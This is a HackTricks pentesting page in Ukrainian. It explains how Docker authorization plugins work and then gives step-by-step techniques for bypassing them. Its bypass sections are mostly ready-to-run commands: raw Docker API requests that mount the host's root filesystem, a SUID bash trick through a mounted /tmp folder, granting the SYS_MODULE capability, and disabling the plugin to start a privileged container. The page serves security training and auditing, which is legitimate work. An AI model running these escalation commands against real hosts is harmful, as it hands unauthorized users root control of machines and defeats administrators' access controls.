{{#include ../../../banners/hacktricks-training.md}}

**Модель** **авторизації** **Docker** з коробки є **все або нічого**. Будь-який користувач, який має дозвіл на доступ до демона Docker, може **виконувати будь-які** команди клієнта Docker. Те ж саме стосується викликів, які використовують API Docker Engine для зв'язку з демоном. Якщо вам потрібен **більший контроль доступу**, ви можете створити **плагіни авторизації** та додати їх до конфігурації демона Docker. Використовуючи плагін авторизації, адміністратор Docker може **налаштувати детальні політики доступу** для управління доступом до демона Docker.

# Основна архітектура

Плагіни авторизації Docker є **зовнішніми** **плагінами**, які ви можете використовувати для **дозволу/заборони** **дій**, запитуваних до демона Docker **в залежності** від **користувача**, який їх запитує, та **запитуваної** **дії**.

**[Наступна інформація з документації](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Коли **HTTP** **запит** надсилається до демона Docker через CLI або через API Engine, **підсистема аутентифікації** **передає** запит до встановленого **плагіна аутентифікації**. Запит містить користувача (викликач) та контекст команди. **Плагін** відповідає за вирішення, чи **дозволити** чи **заборонити** запит.

Діаграми послідовності нижче зображують потік авторизації дозволу та заборони:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

Кожен запит, надісланий до плагіна, **містить аутентифікованого користувача, HTTP заголовки та тіло запиту/відповіді**. Тільки **ім'я користувача** та **метод аутентифікації**, що використовується, передаються до плагіна. Найголовніше, **жодні** облікові **дані** або токени користувача не передаються. Нарешті, **не всі тіла запитів/відповідей надсилаються** до плагіна авторизації. Тільки ті тіла запитів/відповідей, де `Content-Type` є або `text/*`, або `application/json`, надсилаються.

Для команд, які можуть потенційно перехопити HTTP-з'єднання (`HTTP Upgrade`), таких як `exec`, плагін авторизації викликається лише для початкових HTTP-запитів. Після того, як плагін схвалює команду, авторизація не застосовується до решти потоку. Зокрема, потік даних не передається до плагінів авторизації. Для команд, які повертають часткову HTTP-відповідь, таких як `logs` та `events`, лише HTTP-запит надсилається до плагінів авторизації.

Під час обробки запитів/відповідей деякі потоки авторизації можуть потребувати додаткових запитів до демона Docker. Щоб завершити такі потоки, плагіни можуть викликати API демона, подібно до звичайного користувача. Щоб дозволити ці додаткові запити, плагін повинен надати засоби для адміністратора для налаштування належної аутентифікації та політик безпеки.

## Кілька плагінів

Ви несете відповідальність за **реєстрацію** вашого **плагіна** як частини **запуску** демона Docker. Ви можете встановити **кілька плагінів і з'єднати їх разом**. Цей ланцюг може бути впорядкованим. Кожен запит до демона проходить через ланцюг у порядку. Тільки коли **всі плагіни надають доступ** до ресурсу, доступ надається.

# Приклади плагінів

## Twistlock AuthZ Broker

Плагін [**authz**](https://github.com/twistlock/authz) дозволяє вам створити простий **JSON** файл, який **плагін** буде **читати** для авторизації запитів. Таким чином, він дає вам можливість дуже легко контролювати, які API кінцеві точки можуть досягати кожного користувача.

Це приклад, який дозволить Алісі та Бобу створювати нові контейнери: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

На сторінці [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) ви можете знайти зв'язок між запитуваною URL-адресою та дією. На сторінці [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) ви можете знайти зв'язок між назвою дії та дією.

## Простий підручник з плагінів

Ви можете знайти **легкий для розуміння плагін** з детальною інформацією про установку та налагодження тут: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Прочитайте `README` та код `plugin.go`, щоб зрозуміти, як це працює.

# Обхід плагіна авторизації Docker

## Перерахунок доступу

Основні речі, які потрібно перевірити, це **які кінцеві точки дозволені** та **які значення HostConfig дозволені**.

Щоб виконати цей перерахунок, ви можете **використати інструмент** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## заборонено `run --privileged`

### Мінімальні привілеї
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Запуск контейнера та отримання привілейованої сесії

У цьому випадку системний адміністратор **заборонив користувачам монтувати томи та запускати контейнери з прапором `--privileged`** або надавати будь-які додаткові можливості контейнеру:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Однак, користувач може **створити оболонку всередині запущеного контейнера та надати їй додаткові привілеї**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Тепер користувач може втекти з контейнера, використовуючи будь-яку з [**раніше обговорених технік**](#privileged-flag) та **підвищити привілеї** всередині хоста.

## Монтування записуваної папки

У цьому випадку системний адміністратор **заборонив користувачам запускати контейнери з прапором `--privileged`** або надавати будь-які додаткові можливості контейнеру, і він дозволив лише монтувати папку `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> Зверніть увагу, що ви, можливо, не зможете змонтувати папку `/tmp`, але ви можете змонтувати **іншу записувану папку**. Ви можете знайти записувані каталоги за допомогою: `find / -writable -type d 2>/dev/null`
>
> **Зверніть увагу, що не всі каталоги в системі linux підтримують біт suid!** Щоб перевірити, які каталоги підтримують біт suid, виконайте `mount | grep -v "nosuid"` Наприклад, зазвичай `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` та `/var/lib/lxcfs` не підтримують біт suid.
>
> Також зверніть увагу, що якщо ви можете **змонтувати `/etc`** або будь-яку іншу папку **з конфігураційними файлами**, ви можете змінити їх з контейнера docker як root, щоб **зловживати ними на хості** та підвищити привілеї (можливо, змінивши `/etc/shadow`)

## Unchecked API Endpoint

Відповідальність системного адміністратора, який налаштовує цей плагін, полягає в контролі того, які дії та з якими привілеями може виконувати кожен користувач. Тому, якщо адміністратор використовує підхід **чорного списку** з кінцевими точками та атрибутами, він може **забути про деякі з них**, які можуть дозволити зловмиснику **підвищити привілеї.**

Ви можете перевірити API docker за адресою [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### Binds in root

Можливо, коли системний адміністратор налаштовував брандмауер docker, він **забув про деякий важливий параметр** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) такий як "**Binds**".\
У наступному прикладі можливо зловживати цією неправильним налаштуванням, щоб створити та запустити контейнер, який монтує кореневу (/) папку хоста:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> Зверніть увагу, що в цьому прикладі ми використовуємо параметр **`Binds`** як ключ верхнього рівня в JSON, але в API він з'являється під ключем **`HostConfig`**

### Binds in HostConfig

Слідуйте тим же інструкціям, що й з **Binds in root**, виконуючи цей **request** до Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Слідуйте тим самим інструкціям, що й з **Binds in root**, виконуючи цей **request** до Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Слідуйте тим самим інструкціям, що й з **Binds in root**, виконуючи цей **запит** до Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Можливо, що коли системний адміністратор налаштовував docker firewall, він **забув про деякий важливий атрибут параметра** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) як "**Capabilities**" всередині "**HostConfig**". У наступному прикладі можливо зловживати цим неправильним налаштуванням, щоб створити та запустити контейнер з можливістю **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> **`HostConfig`** є ключем, який зазвичай містить **цікаві** **привілеї** для втечі з контейнера. Однак, як ми обговорювали раніше, зверніть увагу, що використання Binds поза ним також працює і може дозволити вам обійти обмеження.

## Вимкнення плагіна

Якщо **системний адміністратор** **забув** **заборонити** можливість **вимкнення** **плагіна**, ви можете скористатися цим, щоб повністю його вимкнути!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Пам'ятайте, щоб **знову увімкнути плагін після ескалації**, або **перезапуск служби docker не спрацює**!

## Опис обходу плагіна авторизації

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
